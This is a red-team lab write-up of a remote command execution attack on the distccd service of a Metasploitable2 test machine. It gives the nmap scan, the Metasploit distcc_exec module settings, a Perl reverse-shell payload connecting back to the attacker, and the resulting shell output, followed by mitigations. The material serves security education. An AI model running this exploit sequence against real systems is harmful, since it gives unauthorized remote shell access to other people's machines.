
# 🧨 Attack Simulation 12: Remote Code Execution via DistCC (CVE-2002-0845)

In this simulation, I exploited a **remote command execution vulnerability** in the `distccd` service running on **Metasploitable2**. This is a classic example of abusing a misconfigured or exposed service to gain shell access.

---

## 🧠 What Is DistCC?

`distcc` is a tool used to distribute C/C++ compilation tasks across multiple machines for performance. It runs a daemon (`distccd`) that listens on a TCP port (default: **3632**) to accept jobs.

✅ **The Problem:** When misconfigured, `distccd` can execute arbitrary shell commands sent in the compilation job — allowing attackers to **execute remote commands** without authentication.

---

## ⚙️ Environment

| Role     | Machine         | IP Address      |
|----------|------------------|-----------------|
| Attacker | Kali Linux       | `192.168.1.30`  |
| Victim   | Metasploitable2  | `192.168.1.155` |

---

## 🔍 Step 1: Port Scanning and Service Discovery

```bash
nmap -sV -p- 192.168.1.155
```

🔎 Output (excerpt):
```
3632/tcp open  distccd  DistCC Daemon
```

![Nmap Results](../../Screenshots/attack-simulation-12/nmap.png)

*Figure 1: Nmap Results*

🧠 **distccd** was exposed on port `3632` — a known vector for remote code execution if left unprotected.

---

## 🎯 Step 2: Launching the Exploit (Metasploit)

Open Metasploit:
```bash
msfconsole
```

Search for the exploit:
```bash
search distccd
```

Use the appropriate module:
```bash
use exploit/unix/misc/distcc_exec
```

Set the target and attacker IPs:
```bash
set RHOSTS 192.168.1.155
set LHOST 192.168.1.30
set LPORT 4444
```

Set a valid reverse shell payload:
```bash
set PAYLOAD cmd/unix/reverse_perl
```

Launch the exploit:
```bash
run
```

✅ Metasploit Output:
```
[*] Started reverse TCP handler on 192.168.1.30:4444
[*] Command shell session 1 opened
```

---

## 🧪 Step 3: Verifying Shell Access

Once the reverse shell connected, I ran:

```bash
whoami
```

Output:
```
daemon
```

![Exploitation](../../Screenshots/attack-simulation-12/exploitation.png)

*Figure 2: Exploitation*

This confirms that I had **remote shell access** as the `daemon` user (a low-privileged user).

---

## 🔍 Technical Explanation

### ✅ How the Exploit Works

- `distccd` accepts and compiles jobs from remote users.
- The exploit sends a "fake" compile job with **shell commands** instead of code.
- These commands are executed on the server by the `distccd` daemon.

### ✅ How the Payload Works

- `cmd/unix/reverse_perl` is a simple **Perl one-liner** reverse shell.
- It tells the victim to connect back to the attacker's IP on port `4444` and bind a shell to it.

---

## 🔐 Security Implications

- **Unauthenticated RCE**: The attacker doesn't need credentials.
- **Easy to exploit**: Works reliably on vulnerable versions of `distccd`.
- **Remote shell**: The attacker can now upload tools, enumerate the machine, or escalate privileges.

---

## 🛡️ Mitigation Strategies

- 🔒 **Firewall** unused ports like 3632 (e.g., `iptables`, `ufw`)
- 🚫 Do not expose `distccd` to the internet
- ✅ Run `distccd` in secure mode or containerized environments
- 🔄 Regularly patch software and audit running services

---

## ✅ Summary

| Step | Action                        | Result                  |
|------|-------------------------------|--------------------------|
| 1    | Scanned target                | Found port 3632 open     |
| 2    | Used Metasploit exploit       | Got reverse shell        |
| 3    | Verified shell access         | `daemon` user shell      |

---

## 📌 Conclusion

This simulation demonstrates how **misconfigured network services** like `distccd` can lead to **remote shell access**. As part of my red team simulations, this adds a critical example of how **authenticated access isn't always needed** to compromise systems.

🔴 Always monitor exposed ports and run services in hardened, least-privileged configurations.